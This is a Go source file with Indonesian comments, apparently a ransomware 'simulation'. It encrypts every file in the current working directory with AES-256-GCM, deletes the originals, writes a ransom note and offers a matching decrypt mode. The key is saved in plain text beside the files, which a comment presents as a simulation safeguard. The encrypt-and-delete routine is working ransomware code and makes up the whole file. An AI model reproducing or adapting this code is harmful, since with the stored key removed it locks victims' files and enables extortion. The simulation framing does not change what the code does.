package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

const (
	encryptedExtension = ".locked"
	keyFileName        = "KUNCI.txt"
	ransomNoteName     = "SURAT.txt"
)

func main() {
	if len(os.Args) < 2 {
		return
	}

	mode := strings.ToLower(os.Args[1])
	targetDir, _ := os.Getwd() // Gunakan direktori saat ini sebagai target

	fmt.Printf("Target Direktori: %s\n\n", targetDir)

	switch mode {
	case "enkripsi", "e":
		lakukanEnkripsi(targetDir)
	case "dekripsi", "d":
		lakukanDekripsi(targetDir)
	default:
		fmt.Printf("Error: Mode '%s' tidak dikenal.\n", mode)
	}
}

// --- MODE ENKRIPSI ---
func lakukanEnkripsi(dir string) {
	fmt.Println("[*] Memulai proses ENKRIPSI...")

	// Buat Kunci Enkripsi Acak
	key := buatKunciAcak()
	fmt.Printf("[+] Kunci enkripsi telah dibuat.\n")

	// Simpan Kunci ke File (INI ADALAH FITUR KEAMANAN UNTUK SIMULASI)
	err := ioutil.WriteFile(filepath.Join(dir, keyFileName), []byte(key), 0644)
	if err != nil {
		fmt.Printf("[ERROR] Gagal menyimpan kunci: %v\n", err)
		return
	}
	fmt.Printf("[+] Kunci telah disimpan di file '%s' untuk tujuan dekripsi.\n", keyFileName)

	// Enkripsi Semua File Target
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		fmt.Printf("[ERROR] Tidak bisa membaca direktori: %v\n", err)
		return
	}

	jumlahTerenkripsi := 0
	for _, file := range files {
		if file.IsDir() || strings.HasSuffix(file.Name(), encryptedExtension) || file.Name() == keyFileName || file.Name() == ransomNoteName ||
			file.Name() == "ransomware.go" || file.Name() == "go.mod" {
			continue
		}

		pathAsli := filepath.Join(dir, file.Name())
		pathTerenkripsi := pathAsli + encryptedExtension

		fmt.Printf("[-] Mengenkripsi: %s\n", file.Name())
		err := enkripsiFile(pathAsli, pathTerenkripsi, key)
		if err != nil {
			fmt.Printf("[ERROR] Gagal mengenkripsi %s: %v\n", file.Name(), err)
			continue
		}

		// Hapus file asli setelah berhasil mengenkripsi
		os.Remove(pathAsli)
		jumlahTerenkripsi++
	}
	fmt.Printf("[✓] Proses enkripsi selesai. %d file telah dienkripsi.\n", jumlahTerenkripsi)

	// Buat Catatan Tebusan
	buatCatatanTebusan(dir)
}

// --- MODE DEKRIPSI ---
func lakukanDekripsi(dir string) {
	fmt.Println("[*] Memulai proses DEKRIPSI...")

	// Baca Kunci dari File
	keyData, err := ioutil.ReadFile(filepath.Join(dir, keyFileName))
	if err != nil {
		fmt.Printf("[ERROR] Gagal membaca file kunci '%s'. Pastikan file ada.\n", keyFileName)
		return
	}
	key := string(keyData)
	fmt.Printf("[+] Kunci dekripsi berhasil dibaca dari '%s'.\n", keyFileName)

	// Dekripsi Semua File Terenkripsi
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		fmt.Printf("[ERROR] Tidak bisa membaca direktori: %v\n", err)
		return
	}

	jumlahDidekripsi := 0
	for _, file := range files {
		if !strings.HasSuffix(file.Name(), encryptedExtension) {
			continue
		}

		pathTerenkripsi := filepath.Join(dir, file.Name())
		pathAsli := strings.TrimSuffix(pathTerenkripsi, encryptedExtension)

		fmt.Printf("[-] Mendekripsi: %s\n", file.Name())
		err := dekripsiFile(pathTerenkripsi, pathAsli, key)
		if err != nil {
			fmt.Printf("[ERROR] Gagal mendekripsi %s: %v\n", file.Name(), err)
			continue
		}

		// Hapus file terenkripsi setelah berhasil mendekripsi
		os.Remove(pathTerenkripsi)
		jumlahDidekripsi++
	}
	fmt.Printf("[✓] Proses dekripsi selesai. %d file telah dikembalikan.\n", jumlahDidekripsi)
}

// --- FUNGSI-FUNGSI PENDUKUNG ---

func buatKunciAcak() string {
	bytes := make([]byte, 32) // 32 bytes untuk AES-256
	if _, err := rand.Read(bytes); err != nil {
		panic(err) // Harus tidak terjadi
	}
	return hex.EncodeToString(bytes)
}

func enkripsiFile(pathAsli, pathHasil, keyHex string) error {
	key, _ := hex.DecodeString(keyHex)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	plaintext, err := ioutil.ReadFile(pathAsli)
	if err != nil {
		return err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ioutil.WriteFile(pathHasil, ciphertext, 0644)
}

func dekripsiFile(pathTerenkripsi, pathHasil, keyHex string) error {
	key, _ := hex.DecodeString(keyHex)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	ciphertext, err := ioutil.ReadFile(pathTerenkripsi)
	if err != nil {
		return err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return fmt.Errorf("ciphertext terlalu pendek")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return err
	}

	return ioutil.WriteFile(pathHasil, plaintext, 0644)
}

func buatCatatanTebusan(dir string) {
	pesan := "Terkena Ransomware!"
	ioutil.WriteFile(filepath.Join(dir, ransomNoteName), []byte(pesan), 0644)
	fmt.Printf("[+] Catatan tebusan '%s' telah dibuat.\n", ransomNoteName)
}
